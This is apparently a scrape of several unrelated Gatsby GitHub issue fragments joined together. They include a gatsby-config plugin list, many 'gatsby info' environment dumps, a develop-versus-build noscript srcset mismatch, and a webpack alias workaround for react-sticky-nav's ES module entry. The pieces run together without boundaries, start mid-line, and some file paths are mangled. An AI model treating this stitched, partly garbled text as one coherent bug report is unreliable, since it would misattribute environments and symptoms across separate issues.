.", url: " ", // no trailing slash allowed! image: "sheild.svg", // path to your image you placed in the \'static\' folder }, plugins: [ `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/assets/`, }, }, `gatsby-plugin-react-helmet`, { resolve: `gatsby-source-filesystem`, options: { name: `src`, path: `${__dirname}/src/`, }, }, `gatsby-transformer-remark`, `gatsby-plugin-sass`, `gatsby-plugin-typescript`, { resolve: `gatsby-plugin-graphql-codegen`, options: { key: \'gatsby\', documentpaths: [ \'./src/**/*.{ts,tsx}\', \'./node_modules/gatsby-*/**/*.js\', ], codegendelay: 200, filename: `types/graphql-types-gatsby.ts` } } ]
``` additional info: * using sass to imprt stylesheets
* react components using sass and css modules
``` system: os: linux 5.5 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.4.20 - /bin/bash binaries: node: 10.16.2 - ~/.nvm/versions/node/v10.16.2/bin/node yarn: 1.22.0 - /usr/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v10.16.2/bin/npm languages: python: 2.7.17 - /usr/bin/python npmglobalpackages: gatsby-cli: 2.11.3
i found another difference in the `<noscript>` tag content:
here is develop content:
<picture> <source media="(min-width: 1920px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/f3583/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/bbee5/isometric-2018x1408.png 1.5x" /> <source media="(min-width: 1366px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/7d603/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/262df/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/428eb/isometric-2018x1408.png 2x" /> <source media="(min-width: 768px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/0756a/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3aed7/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/1dcea/isometric-2018x1408.png 2x" /> <source media="(min-width: 576px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/bb8b5/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/25590/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3aed7/isometric-2018x1408.png 2x" /> <source media="(max-width: 575px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/88670/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3c741/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3225f/isometric-2018x1408.png 2x" /> <img loading="lazy" width="768" height="536" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/0756a/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3aed7/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/1dcea/isometric-2018x1408.png 2x" src="/static/2fc0d917edb04bbc25eaa5e8fdc12946/0756a/isometric-2018x1408.png" alt="" style="position:absolute;top:0;left:0;opacity:1;width:100%;height:100%;object-fit:cover;object-position:center" /></picture>
and here is build content:
<picture> <source media="(min-width: 1920px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/f3583/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/bbee5/isometric-2018x1408.png 1.5x" /> <source media="(min-width: 1366px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/7d603/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/262df/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/428eb/isometric-2018x1408.png 2x" /> <source media="(min-width: 768px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/0756a/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3aed7/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/1dcea/isometric-2018x1408.png 2x" /> <source media="(min-width: 576px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/bb8b5/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/25590/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3aed7/isometric-2018x1408.png 2x" /> <source media="(max-width: 575px)" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/88670/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3c741/isometric-2018x1408.png 1.5x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/3225f/isometric-2018x1408.png 2x" /> <img loading="lazy" width="1200" height="837" srcset="/static/2fc0d917edb04bbc25eaa5e8fdc12946/f3583/isometric-2018x1408.png 1x,
/static/2fc0d917edb04bbc25eaa5e8fdc12946/bbee5/isometric-2018x1408.png 1.5x" src="/static/2fc0d917edb04bbc25eaa5e8fdc12946/f3583/isometric-2018x1408.png" alt="" style="position:absolute;top:0;left:0;opacity:1;width:100%;height:100%;object-fit:cover;object-position:center" /></picture>
the `<img>` element has different value of `srcset` attribute
if i view source of the build package in browser i can see that wrong dimensions are server side rendered.
![image](
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - /var/folders/mt/71kkzssd3fq24s3x3y6wpc4h0000gn/t/yarn--1585653908181-0.6528599744136716/node yarn: 1.22.4 - /var/folders/mt/71kkzssd3fq24s3x3y6wpc4h0000gn/t/yarn--1585653908181-0.6528599744136716/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 80.0.3987.149 firefox: 72.0.2 safari: 13.0.5
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.1 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-image: ^2.2.44 => 2.2.44 gatsby-plugin-manifest: ^2.3.2 => 2.3.2 gatsby-plugin-offline: ^3.0.41 => 3.0.41 gatsby-plugin-react-helmet: ^3.1.24 => 3.1.24 gatsby-plugin-sharp: ^2.5.2 => 2.5.2 gatsby-source-filesystem: ^2.1.56 => 2.1.56 gatsby-transformer-sharp: ^2.4.2 => 2.4.2 npmglobalpackages: gatsby-cli: 2.11.3
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-3570 cpu @ 3.40ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.45 => 2.19.45
system: os: windows 10 10.0.17134 cpu: (4) x64 intel(r) core(tm) i3-4150 cpu @ 3.50ghz binaries: node: 10.16.0 - c:\\program files\ odejs\ ode.exe npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.13 browsers: edge: 42.17134.1098.0 npmpackages: gatsby: ^2.20.8 => 2.20.8 gatsby-image: ^2.3.1 => 2.3.1 gatsby-node-helpers: ^0.3.0 => 0.3.0 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-optimize-svgs: ^1.0.4 => 1.0.4 gatsby-plugin-prismic-preview: ^2.0.0 => 2.0.0 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-sitemap: ^2.3.1 => 2.3.1 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-prismic-graphql: ^3.5.0 => 3.5.0 gatsby-transformer-remark: ^2.7.1 => 2.7.1 gatsby-transformer-sharp: ^2.4.3 => 2.4.3
system: os: macos 10.15.4 cpu: (6) x64 intel(r) core(tm) i5-9600k cpu @ 3.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 73.0.1 safari: 13.1
system: os: linux 4.4 ubuntu 16.04.6 lts (xenial xerus) cpu: (1) x64 intel(r) xeon(r) gold 6140 cpu @ 2.30ghz shell: 4.3.48 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: firefox: 74.0 npmglobalpackages: gatsby-cli: 2.7.2
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i7-7660u cpu @ 2.50ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 10.19.0 - /usr/local/opt/node@10/bin/node npm: 6.13.4 - /usr/local/opt/node@10/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmpackages: gatsby: ^2.20.8 => 2.20.8 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-postcss: ^2.2.1 => 2.2.1 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-source-graphql: ^2.3.0 => 2.3.0 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.8.28
system: os: linux 4.19 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-4590s cpu @ 3.00ghz shell: 4.4.20 - /bin/bash binaries: node: 12.14.1 - /usr/local/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.20.8 => 2.20.8 gatsby-awesome-pagination: ^0.3.5 => 0.3.5 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-emotion: ^4.2.1 => 4.2.1 gatsby-plugin-feed: ^2.4.1 => 2.4.1 gatsby-plugin-google-tagmanager: ^2.2.1 => 2.2.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-nprogress: ^2.2.1 => 2.2.1 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-sitemap: ^2.3.1 => 2.3.1 gatsby-remark-copy-linked-files: ^2.2.1 => 2.2.1 gatsby-remark-images: ^3.2.1 => 3.2.1 gatsby-remark-prismjs: ^3.4.1 => 3.4.1 gatsby-remark-responsive-iframe: ^2.3.1 => 2.3.1 gatsby-remark-smartypants: ^2.2.1 => 2.2.1 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.7.1 => 2.7.1 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.8.30
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 10.14.0 - /var/folders/xh/kxyylf2j2k51pw11htddhb9c0000gn/t/yarn--1585491262407-0.3432572041341917/node yarn: 1.12.3 - /var/folders/xh/kxyylf2j2k51pw11htddhb9c0000gn/t/yarn--1585491262407-0.3432572041341917/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.14.0/bin/npm languages: python: 2.7.16 - /users/tommygraves/.pyenv/shims/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-image: ^2.2.44 => 2.2.44 gatsby-plugin-manifest: ^2.2.48 => 2.2.48 gatsby-plugin-offline: ^3.0.41 => 3.0.41 gatsby-plugin-react-helmet: ^3.1.24 => 3.1.24 gatsby-plugin-sharp: ^2.4.13 => 2.4.13 gatsby-source-filesystem: ^2.1.56 => 2.1.56 gatsby-transformer-sharp: ^2.3.19 => 2.3.19
``` if you remove all the static queries from the components, the command runs successfully and has the expected behavior
tagging @dominicfallows since they built this feature
i do wonder if this is related to since the pr and documentation around gatsby_experimental_page_build_on_data_changes mention the old redux.state file rather than the new redux directory
thanks friends!
``` system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - /var/folders/39/ckp57kpn5td4dvrdqf8xv0qw0000gp/t/yarn--1585472500682-0.839597419841517/node yarn: 1.22.0 - /var/folders/39/ckp57kpn5td4dvrdqf8xv0qw0000gp/t/yarn--1585472500682-0.839597419841517/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 13.11.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmpackages: gatsby: 2.20.4 => 2.20.4 gatsby-image: 2.3.1 => 2.3.1 gatsby-plugin-postcss: 2.2.1 => 2.2.1 gatsby-plugin-react-helmet-async: 1.0.16 => 1.0.16 gatsby-plugin-remove-generator: 1.0.4 => 1.0.4 gatsby-plugin-sharp: 2.5.3 => 2.5.3 gatsby-plugin-sitemap: 2.3.1 => 2.3.1 gatsby-plugin-typescript: 2.3.1 => 2.3.1 gatsby-remark-images: 3.2.1 => 3.2.1 gatsby-source-filesystem: 2.2.2 => 2.2.2 gatsby-transformer-remark: 2.7.1 => 2.7.1 gatsby-transformer-sharp: 2.4.2 => 2.4.2 npmglobalpackages: gatsby-cli: 2.8.29
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-3820qm cpu @ 2.70ghz shell: 5.0.11 - /usr/local/bin/bash binaries: node: 13.0.1 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 3.8.1 - /usr/local/bin/python browsers: chrome: 81.0.4044.34 safari: 13.0.5 npmglobalpackages: gatsby-cli: 2.7.2
system: os: linux 5.5 arch linux cpu: (4) x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 5.0.16 - /bin/bash binaries: node: 13.11.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.3 - /usr/bin/npm languages: python: 3.8.2 - /usr/bin/python browsers: firefox: 74.0 npmpackages: gatsby: ^2.19.45 => 2.20.7 ### my own analysis i started from the gatsby hello world starter, installed react-sticky-nav, and changed `src/pages/index.js` to use it: ```
import react from "react"
import navigation from "react-sticky-nav" export default () => ( <div> <navigation /> <div>hello world!</div> </div>
``` react-sticky-nav's package.json is built as both commonjs moudle and es module
its package.json has:
``` "main": "index.js", "module": "index.mjs",
``` index.mjs has:
import react,{memo,forwardref,usestate,useref,usecallback,useeffect}from'react';
``` react is a commonjs-only module, so this kind of importing is not valid in nodejs
an es module can only import the default export from a commonjs module
however, i think it works with webpack, i.e
webpack's import/require tracking supports importing non-default exports from commonjs modules, as well as mixing import and require
the question is, why is `node_modules/react-sticky-nav/index.mjs` picked up by gatsby when doing ssr instead of `node_modules/react-sticky-nav/index.js`
### workaround forcing the use of `node_modules/react-sticky-nav/index.js` fixes this issue
gatsby-node.js:
exports.oncreatewebpackconfig = ({ actions }) => { actions.setwebpackconfig({ resolve: { alias: { 'react-sticky-nav': path.resolve( __dirname, 'node_modules/react-sticky-nav/index.js' ), }, }, })
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.14 - /users/cdaringe/.asdf/shims/python browsers: chrome: 80.0.3987.149 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: 2.19.22 => 2.19.22 gatsby-image: 2.2.41 => 2.2.41 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-react-helmet: 3.1.22 => 3.1.22 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: 2.4.5 => 2.4.5 gatsby-plugin-webpack-bundle-analyser-v2: 1.1.8 => 1.1.8 gatsby-plugin-workerize-loader: ^1.1.0 => 1.1.0 gatsby-source-filesystem: 2.1.48 => 2.1.48 gatsby-transformer-remark: 2.6.53 => 2.6.53 gatsby-transformer-sharp: 2.3.14 => 2.3.14
production `
system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (2) x64 intel(r) xeon(r) gold 6140 cpu @ 2.30ghz shell: 4.4.20 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.2 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.19.5 => 2.20.7 gatsby-cli: ^2.11.2 => 2.11.2 gatsby-image: ^2.2.39 => 2.2.43 gatsby-link: ^2.2.28 => 2.2.30 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-algolia: ^0.5.0 => 0.5.0 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-analytics: ^0.2.0 => 0.2.0 gatsby-plugin-catch-links: ^2.0.2 => 2.1.27 gatsby-plugin-dark-mode: ^1.1.0 => 1.1.0 gatsby-plugin-facebook-analytics: ^2.2.20 => 2.2.22 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-feed: ^2.0.5 => 2.3.28 gatsby-plugin-firebase: ^0.1.8 => 0.1.8 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.37 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-guess-js: ^1.1.31 => 1.1.31 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-intercom-spa: ^0.2.0 => 0.2.0 gatsby-plugin-intl: ^0.3.3 => 0.3.3 gatsby-plugin-layout: ^1.0.2 => 1.1.23 gatsby-plugin-lint-queries: ^0.0.3 => 0.0.3 gatsby-plugin-mailchimp: ^5.1.2 => 5.1.2 gatsby-plugin-manifest: ^2.2.40 => 2.2.45 gatsby-plugin-netlify: ^2.0.0 => 2.1.34 gatsby-plugin-nprogress: ^2.1.18 => 2.1.20 gatsby-plugin-offline: ^3.0.33 => 3.0.38 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-provide-react: ^1.0.0 => 1.0.0 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.23 gatsby-plugin-react-redux: ^1.1.0-0 => 1.1.0-0 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.1.22 => 2.1.22 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.4.0 => 2.5.3 gatsby-plugin-sitemap: ^2.2.26 => 2.2.28 gatsby-plugin-styled-components: ^3.1.18 => 3.1.20 gatsby-plugin-styled-jsx: ^3.0.1 => 3.1.20 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-copy-linked-files: ^2.0.5 => 2.1.39 gatsby-remark-emojis: ^0.2.3 => 0.2.5 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.43 => 3.1.47 gatsby-remark-prismjs: ^3.3.30 => 3.3.33 gatsby-source-filesystem: ^2.1.47 => 2.1.51 gatsby-source-googlemaps-geocoding: ^1.0.0 => 1.0.0 gatsby-source-instagram: ^0.7.0 => 0.7.0 gatsby-source-magento: file:plugins/gatsby-source-magento => 1.6.5 gatsby-source-wordpress: file:plugins/gatsby-source-wordpress => 3.1.60 gatsby-transformer-json: ^2.2.25 => 2.2.27 gatsby-transformer-remark: ^2.6.49 => 2.6.56 gatsby-transformer-sharp: ^2.3.13 => 2.3.17 npmglobalpackages: gatsby-cli: 2.10.4
system: os: macos 10.14.4 cpu: x64 intel(r) core(tm) i5-7500 cpu @ 3.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.1 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 80.0.3987.149 firefox: 64.0.2 safari: 12.1 npmpackages: gatsby: ^2.20.7 => 2.20.7 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-create-client-paths: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-favicon: ^3.1.2 => 3.1.2 gatsby-plugin-force-trailing-slashes: ^1.0.4 => 1.0.4 gatsby-plugin-google-analytics: ^2.0.7 => 2.0.7 gatsby-plugin-google-tagmanager: ^2.0.6 => 2.0.6 gatsby-plugin-manifest: ^2.2.31 => 2.2.40 gatsby-plugin-netlify: ^2.1.3 => 2.1.3 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-node-fields: ^1.0.0 => 1.0.0 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.21 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0 gatsby-plugin-sharp: ^2.3.5 => 2.4.4 gatsby-plugin-sitemap: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-sri: ^1.0.2 => 1.0.2 gatsby-plugin-styled-components: ^3.0.0-rc.0 => 3.0.0-rc.0 gatsby-source-wordpress: ^3.2.2 => 3.2.2 gatsby-transformer-sharp: ^2.3.6 => 2.3.13 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-6300u cpu @ 2.40ghz binaries: node: 12.0.0 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.2 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.7 => 2.20.6 gatsby-image: ^2.2.39 => 2.3.1 gatsby-plugin-chakra-ui: ^0.1.4 => 0.1.4 gatsby-plugin-create-client-paths: ^2.1.24 => 2.2.1 gatsby-plugin-firebase: ^0.2.0-beta.4 => 0.2.0-beta.4 gatsby-plugin-manifest: ^2.2.39 => 2.3.2 gatsby-plugin-offline: ^3.0.32 => 3.1.1 gatsby-plugin-react-helmet: ^3.1.21 => 3.2.1 gatsby-plugin-sharp: ^2.4.3 => 2.5.3 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.1.46 => 2.2.2 gatsby-transformer-sharp: ^2.3.13 => 2.4.2
this happens in develop and production builds
``` system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (4) x64 intel(r) core(tm) i7-7700 cpu @ 3.60ghz shell: 4.4.12 - /bin/bash binaries: node: 12.13.1 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.12.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: 2.19.22 => 2.19.22 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-google-analytics: ^2.2.1 => 2.2.1 gatsby-plugin-manifest: ^2.3.2 => 2.3.2 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^3.1.1 => 3.1.1 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sass: ^2.2.1 => 2.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-sharp: ^2.4.2 => 2.4.2 npmglobalpackages: gatsby-cli: 2.11.1
same as above
> gatsby info system: os: linux 4.4 ubuntu 16.04.6 lts (xenial xerus) cpu: (4) x64 intel(r) core(tm) i7-2620m cpu @ 2.70ghz shell: 4.3.48 - /bin/bash
binaries: node: 12.15.0 - ~/.nvm/versions/node/v12.15.0/bin/node yarn: 1.12.3 - /usr/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.15.0/bin/npm
languages: python: 2.7.12 - /usr/bin/python
browsers: firefox: 74.0
npmpackages: gatsby: ^2.19.45 => 2.19.45
npmglobalpackages: gatsby-cli: 2.10.9 ```
i'm using wsl with fish shell but we're also getting the issue in ci which is pure ubuntu 18
``` system: os: linux 4.19 ubuntu 16.04.4 lts (xenial xerus) cpu: (4) x64 intel(r) core(tm) i5-6500 cpu @ 3.20ghz shell: 4.3.48 - /bin/bash binaries: node: 12.13.1 - ~/.config/nvm/12.13.1/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.12.1 - ~/.config/nvm/12.13.1/bin/npm languages: python: 2.7.12 - /usr/bin/python npmpackages: gatsby: 2.20.3 => 2.20.3 gatsby-plugin-alias-imports: 1.0.5 => 1.0.5 gatsby-plugin-mdx: 1.1.1 => 1.1.1 gatsby-plugin-react-helmet: 3.2.1 => 3.2.1 gatsby-plugin-treat: 1.2.3 => 1.2.3 gatsby-plugin-typescript: 2.3.1 => 2.3.1 gatsby-remark-prismjs: 3.4.1 => 3.4.1 gatsby-source-filesystem: 2.2.2 => 2.2.2
run `gatsby develop` ### my project repo
system: os: windows 10 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz binaries: yarn: 1.18.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 - /c/users/jyoun/.windows-build-tools/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.5 => 2.19.45 gatsby-image: ^2.2.39 => 2.2.44 gatsby-plugin-benchmark-reporting: * => 0.0.13 gatsby-plugin-feed: ^2.3.26 => 2.3.29 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.38 gatsby-plugin-manifest: ^2.2.38 => 2.2.48 gatsby-plugin-mdx: ^1.0.83 => 1.0.83 gatsby-plugin-offline: ^3.0.32 => 3.0.41 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.24 gatsby-plugin-sharp: ^2.4.0 => 2.4.13 gatsby-plugin-typography: ^2.3.21 => 2.3.25 gatsby-remark-copy-linked-files: ^2.1.36 => 2.1.40 gatsby-remark-images: ^3.1.42 => 3.1.50 gatsby-remark-prismjs: ^3.3.30 => 3.3.36 gatsby-remark-responsive-iframe: ^2.2.31 => 2.2.34 gatsby-remark-smartypants: ^2.1.20 => 2.1.23 gatsby-source-filesystem: ^2.1.46 => 2.1.56 gatsby-transformer-remark: ^2.6.48 => 2.6.59 gatsby-transformer-sharp: ^2.3.13 => 2.3.19
(sorry, i lost yarn@2 setup
i paste yarn@1 env) ``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-4258u cpu @ 2.40ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 13.7.0 - ~/.nvm/versions/node/v13.7.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.6 - ~/.nvm/versions/node/v13.7.0/bin/npm languages: python: 3.8.2 - /users/item4/.virtualenvs/drf-yasg-examples/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5 npmpackages: gatsby: ^2.13.3 => 2.19.45 gatsby-plugin-emotion: ^4.1.0 => 4.1.25 gatsby-plugin-feed: ^2.3.2 => 2.3.29 gatsby-plugin-google-analytics: ^2.1.4 => 2.1.38 gatsby-plugin-manifest: ^2.2.1 => 2.2.48 gatsby-plugin-offline: ^3.0.6 => 3.0.41 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.24 gatsby-plugin-sharp: ^2.2.2 => 2.4.13 gatsby-plugin-sitemap: ^2.2.3 => 2.2.30 gatsby-plugin-typescript: ^2.1.0 => 2.2.5 gatsby-plugin-typescript-checker: ^1.0.3 => 1.1.1 gatsby-remark-copy-linked-files: ^2.1.0 => 2.1.40 gatsby-remark-images: ^3.1.2 => 3.1.50 gatsby-remark-prismjs: ^3.3.1 => 3.3.36 gatsby-remark-responsive-iframe: ^2.2.1 => 2.2.34 gatsby-remark-smartypants: ^2.1.0 => 2.1.23 gatsby-source-filesystem: ^2.1.2 => 2.1.56 gatsby-transformer-remark: ^2.5.0 => 2.6.59 ```
